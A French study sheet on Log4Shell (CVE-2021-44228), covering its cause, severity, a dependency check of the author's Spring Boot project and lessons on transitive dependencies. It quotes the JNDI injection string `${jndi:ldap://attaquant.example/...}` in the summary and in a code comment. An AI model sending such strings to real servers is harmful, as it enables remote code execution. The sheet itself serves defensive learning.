# Log4Shell — exécution de code à distance dans Log4j 2

> 📌 **Fiche d'exemple** : cas d'école (2021) à connaître pour l'oral. Remplacez-la ou complétez-la par vos propres fiches sur des vulnérabilités récentes de votre pile.

| Champ | Valeur |
|---|---|
| **Date de la fiche** | _AAAA-MM-JJ_ |
| **Date de l'information** | 2021-12-09 (divulgation publique) |
| **Type** | Vulnérabilité (CVE) |
| **Identifiants** | CVE-2021-44228 · CWE-917 (injection d'expression) / CWE-502 · Alerte CERT-FR CERTFR-2021-ALE-022 |
| **Gravité** | CVSS 10.0 (Critique) · KEV : oui |
| **Composants concernés** | Apache Log4j 2 (`log4j-core`) 2.0-beta9 à 2.14.1 · Corrigé définitivement en 2.17.1 (Java 8+) après plusieurs correctifs successifs |
| **Priorité pour mon projet** | ⚪ P4 (vérifié non concerné) |
| **Tags** | #cve #java #rce #injection #dependances #cas-d-ecole |

## Sources

1. [NVD — CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
2. [Apache Log4j — Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
3. [CERT-FR — CERTFR-2021-ALE-022](https://www.cert.ssi.gouv.fr/alerte/CERTFR-2021-ALE-022/)

## Résumé

Log4j 2, bibliothèque de journalisation Java extrêmement répandue, interprétait des expressions `${...}` présentes **dans les messages journalisés**. Un attaquant pouvait envoyer une chaîne comme `${jndi:ldap://attaquant.example/a}` dans n'importe quel champ journalisé (User-Agent, identifiant de connexion…) : le serveur contactait alors le serveur LDAP de l'attaquant et pouvait **charger et exécuter du code distant**. Exploitation massive dans les heures qui ont suivi la publication.

## Explication technique

```java
// Code d'apparence anodine :
logger.info("Échec de connexion pour l'utilisateur : " + login);
// Si login = "${jndi:ldap://attaquant.example/x}", Log4j ≤ 2.14.1 effectue une
// résolution JNDI → téléchargement et exécution d'une classe distante.
```

Trois facteurs expliquent la gravité :

1. **Donnée non fiable** interprétée comme du code (fonctionnalité de *lookup* activée par défaut).
2. **Dépendance transitive** : beaucoup d'équipes ignoraient utiliser Log4j (embarqué par d'autres bibliothèques).
3. **Surface énorme** : serveurs, applications métier, équipements, jeux…

## Impact sur mon projet

- Spring Boot utilise **Logback** par défaut, pas Log4j 2.
- Vérification réalisée :

  ```bash
  mvn dependency:tree | grep -i log4j
  # → seul log4j-api (via log4j-to-slf4j) apparaît, pas log4j-core : non vulnérable
  ```

## Action menée

- [x] Vérification de l'arbre de dépendances (aucun `log4j-core`).
- [x] Ajout d'OWASP Dependency-Check dans la CI pour détecter automatiquement ce type de cas.

## Ce que j'en retiens

- **Connaître ses dépendances transitives** (SBOM, `dependency:tree`, `npm ls`).
- **Ne jamais faire confiance aux entrées utilisateur**, même dans les logs.
- Une alerte critique se traite en **heures**, pas en semaines : d'où l'intérêt d'une veille en mode push sur sa pile.
